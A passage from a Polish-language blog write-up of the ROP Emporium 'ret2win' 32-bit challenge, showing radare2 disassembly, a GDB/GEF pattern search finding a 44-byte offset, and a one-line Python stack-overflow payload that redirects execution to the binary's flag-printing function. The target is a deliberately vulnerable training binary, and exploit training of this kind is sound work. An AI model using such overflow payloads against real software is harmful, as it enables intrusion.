<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804862c</font>      <font color=#A0A0A0>83c410</font>         <font color=#D0A0A0>add</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0x10</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804862f</font>      <font color=#A0A0A0>83ec0c</font>         <font color=#D0A0A0>sub</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0xc</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048632</font>      <font color=#D0D0C0>6821</font><font color=#A0A0A0>880408</font>     <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>0x8048821</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048637</font>      <font color=#A0A0A0>e8c4fd</font><font color=#80A080>ffff</font>     <font color=#D05020>call sym.imp.printf</font><font color=#70A070>         ; int printf(const char *format)</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804863c</font>      <font color=#A0A0A0>83c410</font>         <font color=#D0A0A0>add</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0x10</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804863f</font>      <font color=#A0A0A0>a1</font><font color=#D0D0C0>60</font><font color=#A0A0A0>a00408</font>     <font color=#C0D090>mov</font><font color=#80D0D0> eax</font>,<font color=#80D0D0> dword </font>[<font color=#C08080>obj.stdin</font>]<font color=#70A070>  ; obj.stdin__GLIBC_2.0 ; [0x804a060:4]=0</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048644</font>      <font color=#A0A0A0>83ec04</font>         <font color=#D0A0A0>sub</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>4</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048647</font>      <font color=#D0D0C0>50</font>             <font color=#F0F0C0>push</font><font color=#80D0D0> eax</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048648</font>      <font color=#D0D0C0>6a32</font>           <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>0x32</font><font color=#70A070>                   ; &apos;2&apos; ; 50</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804864a</font>      <font color=#A0A0A0>8d</font><font color=#D0D0C0>45</font><font color=#A0A0A0>d8</font>         <font color=#C0D090>lea</font><font color=#80D0D0> eax</font>,<font color=#80D0D0> </font>[<font color=#E0E0C0>local_28h</font>]
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804864d</font>      <font color=#D0D0C0>50</font>             <font color=#F0F0C0>push</font><font color=#80D0D0> eax</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804864e</font>      <font color=#A0A0A0>e8bdfd</font><font color=#80A080>ffff</font>     <font color=#D05020>call sym.imp.fgets</font><font color=#70A070>          ; char *fgets(char *s, int size, FILE *stream)</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048653</font>      <font color=#A0A0A0>83c410</font>         <font color=#D0A0A0>add</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0x10</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048656</font>      <font color=#A0A0A0>90</font>             <font color=#80A080>nop</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048657</font>      <font color=#A0A0A0>c9</font>             <font color=#F0F0C0>leave</font>
<font color=#D0D0C0>└</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048658</font>      <font color=#A0A0A0>c3</font>             <font color=#F0F080>ret</font>
<font color=#D05000>[0x08048480]&gt;</font>
</pre><hr><p>Sama docelowa funkcja, którą należy wykonać jest bardzo prosta:</p><hr><pre><font color=#D05000>[0x08048480]&gt;</font> pdf @ sym.ret2win
<font color=#D0D0C0>┌</font> <font color=#D05000>(fcn) sym.ret2win</font> 41
<font color=#D0D0C0>│</font>   <font color=#D05000>sym.ret2win</font> ();
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048659</font>      <font color=#D0D0C0>55</font>             <font color=#F0F0C0>push</font><font color=#80D0D0> ebp</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804865a</font>      <font color=#A0A0A0>89e5</font>           <font color=#C0D090>mov</font><font color=#80D0D0> ebp</font>,<font color=#80D0D0> esp</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804865c</font>      <font color=#A0A0A0>83ec08</font>         <font color=#D0A0A0>sub</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>8</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804865f</font>      <font color=#A0A0A0>83ec0c</font>         <font color=#D0A0A0>sub</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0xc</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048662</font>      <font color=#D0D0C0>6824</font><font color=#A0A0A0>880408</font>     <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>str.Thank_you__Here_s_your_flag:</font><font color=#70A070> ; 0x8048824 ; &quot;Thank you! Here&apos;s your flag:&quot;</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048667</font>      <font color=#A0A0A0>e894fd</font><font color=#80A080>ffff</font>     <font color=#D05020>call sym.imp.printf</font><font color=#70A070>         ; int printf(const char *format)</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804866c</font>      <font color=#A0A0A0>83c410</font>         <font color=#D0A0A0>add</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0x10</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804866f</font>      <font color=#A0A0A0>83ec0c</font>         <font color=#D0A0A0>sub</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0xc</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048672</font>      <font color=#D0D0C0>6841</font><font color=#A0A0A0>880408</font>     <font color=#F0F0C0>push</font><font color=#80D0D0> </font><font color=#C08080>str.bin_cat_flag.txt</font><font color=#70A070>   ; 0x8048841 ; &quot;/bin/cat flag.txt&quot;</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048677</font>      <font color=#A0A0A0>e8b4fd</font><font color=#80A080>ffff</font>     <font color=#D05020>call sym.imp.system</font><font color=#70A070>         ; int system(const char *string)</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804867c</font>      <font color=#A0A0A0>83c410</font>         <font color=#D0A0A0>add</font><font color=#80D0D0> esp</font>,<font color=#80D0D0> </font><font color=#C08080>0x10</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x0804867f</font>      <font color=#A0A0A0>90</font>             <font color=#80A080>nop</font>
<font color=#D0D0C0>│</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048680</font>      <font color=#A0A0A0>c9</font>             <font color=#F0F0C0>leave</font>
<font color=#D0D0C0>└</font> <font color=#D05000>          </font><font color=#A0A0A0>0x08048681</font>      <font color=#A0A0A0>c3</font>             <font color=#F0F080>ret</font>
<font color=#D05000>[0x08048480]&gt;</font>
</pre><hr><p><code>0x08048677</code> to adres wywołania funkcji <code>system()</code> z argumentem <code>"/bin/cat flag.txt"</code> (wrzucony na stack instrukcję wyżej). To musi być cel! (A niby wystarczyło pobrać zbiór zadań i dla każdego zipa wyświetlić flag.txt ;P )</p><p>No dobrze, więc jak do tego przystąpić? Zacznijmy od analizy <code>sym.pwnme</code> i określenia liczby bajtów potrzebnych do nadpisania <code>instruction pointera</code>. Do tego celu użyłem GDB wraz z rozszerzeniem <code>GEF</code>. Korzystając z ciągu de Bruijna:</p><hr><pre><font color=#EF2929><b>gef➤  </b></font>pattern create 50
<font color=#729FCF><b>[+]</b></font> Generating a pattern of 50 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
<font color=#8AE234><b>[+]</b></font> Saved as &apos;$_gef0&apos;
<font color=#EF2929><b>gef➤  </b></font>r
Starting program: /root/rop/ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don&apos;t worry about null bytes, we&apos;re using fgets!

&gt; aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
[ Legend: <font color=#EF2929><b>Modified register</b></font> | <font color=#CC0000>Code</font> | <font color=#4E9A06>Heap</font> | <font color=#75507B>Stack</font> | <font color=#C4A000>String</font> ]
<font color=#585858><b>──────────────────────────────────────────────────────────── </b></font><font color=#06989A>registers</font><font color=#585858><b> ────</b></font>
<font color=#EF2929><b>$eax   </b></font>: <font color=#75507B>0xffffd300</font>  →  <font color=#C4A000>&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam&quot;</font>
<font color=#3465A4>$ebx   </font>: 0x0
<font color=#EF2929><b>$ecx   </b></font>: 0xf7fa789c  →  0x00000000
<font color=#EF2929><b>$edx   </b></font>: <font color=#75507B>0xffffd300</font>  →  <font color=#C4A000>&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam&quot;</font>
<font color=#EF2929><b>$esp   </b></font>: <font color=#75507B>0xffffd330</font>  →  <font color=#CC0000>0xf7fe006d</font>  →  <font color=#585858><b> jge 0xf7fe0077</b></font>
<font color=#EF2929><b>$ebp   </b></font>: 0x6161616b (&quot;<font color=#C4A000>kaaa</font>&quot;?)
<font color=#EF2929><b>$esi   </b></font>: 0xf7fa6000  →  0x001d9d6c
<font color=#EF2929><b>$edi   </b></font>: 0xf7fa6000  →  0x001d9d6c
<font color=#EF2929><b>$eip   </b></font>: 0x6161616c (&quot;<font color=#C4A000>laaa</font>&quot;?)
<font color=#EF2929><b>$eflags</b></font>: [zero carry <b>PARITY</b> adjust <b>SIGN</b> trap <b>INTERRUPT</b> direction overflow <b>RESUME</b> virtualx86 identification]
<font color=#3465A4>$cs</font>: 0x0023 <font color=#3465A4>$ss</font>: 0x002b <font color=#3465A4>$ds</font>: 0x002b <font color=#3465A4>$es</font>: 0x002b <font color=#3465A4>$fs</font>: 0x0000 <font color=#EF2929><b>$gs</b></font>: 0x0063
<font color=#585858><b>────────────────────────────────────── </b></font><font color=#06989A>stack</font><font color=#585858><b> ────</b></font>
<font color=#06989A>0xffffd330</font>│+0x0000: <font color=#CC0000>0xf7fe006d</font>  →  <font color=#585858><b> jge 0xf7fe0077</b></font>	<font color=#729FCF><b> ← $esp</b></font>
<font color=#06989A>0xffffd334</font>│+0x0004: <font color=#75507B>0xffffd350</font>  →  0x00000001
<font color=#06989A>0xffffd338</font>│+0x0008: 0x00000000
<font color=#06989A>0xffffd33c</font>│+0x000c: <font color=#CC0000>0xf7de6b41</font>  →  <font color=#585858><b>&lt;__libc_start_main+241&gt; add esp, 0x10</b></font>
<font color=#06989A>0xffffd340</font>│+0x0010: 0xf7fa6000  →  0x001d9d6c
<font color=#06989A>0xffffd344</font>│+0x0014: 0xf7fa6000  →  0x001d9d6c
<font color=#06989A>0xffffd348</font>│+0x0018: 0x00000000
<font color=#06989A>0xffffd34c</font>│+0x001c: <font color=#CC0000>0xf7de6b41</font>  →  <font color=#585858><b>&lt;__libc_start_main+241&gt; add esp, 0x10</b></font>
<font color=#585858><b>───────────────────────────────────────────────────── </b></font><font color=#06989A>code:x86:32</font><font color=#585858><b> ────</b></font>
<font color=#EF2929><b>[!]</b></font> Cannot disassemble from $PC
<font color=#EF2929><b>[!]</b></font> Cannot access memory at address 0x6161616c
<font color=#585858><b>───────────────────────────────────────────────────────────────────── </b></font><font color=#06989A>threads</font><font color=#585858><b> ────</b></font>
[<font color=#AD7FA8><b>#0</b></font>] Id 1, Name: &quot;ret2win32&quot;, <font color=#EF2929><b>stopped</b></font>, reason: <font color=#AD7FA8><b>SIGSEGV</b></font>
<font color=#585858><b>──────────────────────────────────────────────────────────────────────────</b></font><font color=#06989A>trace</font><font color=#585858><b> ────</b></font>
<font color=#8AE234><b>gef➤  </b></font>pattern search $eip
<font color=#729FCF><b>[+]</b></font> Searching &apos;$eip&apos;
<font color=#8AE234><b>[+]</b></font> Found at offset 44 (little-endian search) <font color=#EF2929><b>likely</b></font>
<font color=#8AE234><b>[+]</b></font> Found at offset 41 (big-endian search)
<font color=#8AE234><b>gef➤  </b></font>
</pre><hr><p>Adresem funkcji, pod który trzeba powrócić po wykonaniu <code>sym.pwnme</code> jest <code>0x08048659</code>. Czy to wystarczy? W tym przypadku powinno. Aby się o tym przekonać, zapiszmy cały bufor losowymi wartościami - długość tego ciągu powinna wynosić 44 bajty, a następnie nadpiszmy wartość powrotu adresem <code>ret2win</code>. Oto efekt:</p><hr><pre><font color=#EF2929><b>root@kali</b></font>:<font color=#729FCF><b>~/rop</b></font># python -c &quot;print &apos;A&apos;*44 + &apos;\x59\x86\x04\x08&apos; &quot; | ./ret2win32
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don&apos;t worry about null bytes, we&apos;re using fgets!

&gt; Thank you! Here&apos;s your flag:ROPE{a_placeholder_32byte_flag!}
</pre><hr><pre tabindex=0><code>ROPE{a_placeholder_32byte_flag!}
</code></pre><p>Badum tss! Dobra, czas na coś trudniejszego&mldr;</p><p>Do zobaczenia w Internecie!</p><p>foxtrot_charlie</p></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>copyright by foxtrot_charlie</span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://foxtrotlabs.cc/assets/main.js></script><script src=https://foxtrotlabs.cc/assets/prism.js></script></div></body></html>